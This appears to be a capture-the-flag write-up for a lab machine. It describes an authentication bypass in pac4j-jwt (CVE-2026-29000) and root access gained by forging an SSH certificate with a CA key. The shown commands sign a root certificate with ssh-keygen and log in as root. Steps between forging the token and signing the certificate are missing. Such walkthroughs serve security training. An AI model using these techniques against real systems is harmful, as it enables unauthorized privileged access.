Principal is a medium difficulty machine that is themed around misplaced cryptographic trust. The foothold exploits [CVE-2026-29000](https://nvd.nist.gov/vuln/detail/CVE-2026-29000), an authentication bypass in pac4j-jwt&#039;s JwtAuthenticator where a PlainJWT wrapped inside a valid JWE envelope bypasses signature verification entirely. After forging an admin token and extracting SSH credentials from the corporate dashboard, privilege escalation abuses an SSH CA configuration that trusts any certificate signed by the CA without validating the principal (username) claim, allowing us to forge a certificate for root. Both attack stages exploit the same class of flaw: a system that verifies the cryptographic envelope but never validates the identity claim inside it.

We'll head to `http://10.129.40.176:8080/login` to see what the port 8080 has in store for us.
![[Pasted image 20260419111626.png]]

We can see a login page, but checking the page source we can dig deeper in the WebApp code.

In line `110` we can find this: `<script src="/static/js/app.js"></script>` which means that the javascript of this app is stored at `/static/js/app.js`, so let's check it out.

In the script page we can find this:
```
const API_BASE = '';
const JWKS_ENDPOINT = '/api/auth/jwks';
const AUTH_ENDPOINT = '/api/auth/login';
const DASHBOARD_ENDPOINT = '/api/dashboard';
const USERS_ENDPOINT = '/api/users';
const SETTINGS_ENDPOINT = '/api/settings';
```

These are really good endpoints for enumeration.

### /api/auth/login:
```
<html><body><h1>Whitelabel Error Page</h1><p>This application has no explicit mapping for /error, so you are seeing this as a fallback.</p><div id='created'>Sun Apr 19 09:24:46 UTC 2026</div><div>There was an unexpected error (type=Method Not Allowed, status=405).</div></body></html>
```

This error does not mean that the page does not exist, but rather that the HTTP method you used is not the one the server expects for that URL.

That's because accessing through the browser is esentially a `curl GET`, and the resource doesn't expect that `GET` method.

```
❯ curl -X OPTIONS http://10.129.40.176:8080/api/auth/login -i

Date: Sun, 19 Apr 2026 09:36:52 GMT
Server: Jetty

Allow: POST,OPTIONS
Accept-Patch: 
Content-Length: 0
```

As i imagined, the server expects a `POST` in order to perform a login.

## Exploitation
#### CVE-2026-29000
**As NIST mentions:** pac4j-jwt versions prior to 4.5.9, 5.7.9, and 6.3.3 contain an authentication bypass vulnerability in JwtAuthenticator when processing encrypted JWTs that allows remote attackers to forge authentication tokens. Attackers who possess the server's RSA public key can create a JWE-wrapped PlainJWT with arbitrary subject and role claims, bypassing signature verification to authenticate as any user including administrators.

So let's start by crafting our JWT, this time we will use `jwt.io`

After this, we have to give permissions and sign the certificate.
```
svc-deploy@principal:~$ chmod 600 /tmp/cakey
svc-deploy@principal:~$ ssh-keygen -s /tmp/cakey -I "pwn_session" -n root -V +1h /tmp/id_root.pub
Signed user key /tmp/id_root-cert.pub: id "pwn_session" serial 0 for root valid from 2026-04-19T11:01:00 to 2026-04-19T12:02:58
```

Now that all this is done, all that's left is to log in as root.
```
svc-deploy@principal:~$ ssh -i /tmp/id_root root@localhost

Now we just have to retrieve the root flag!
```
root@principal:~# ls

root@principal:~# cat root.txt
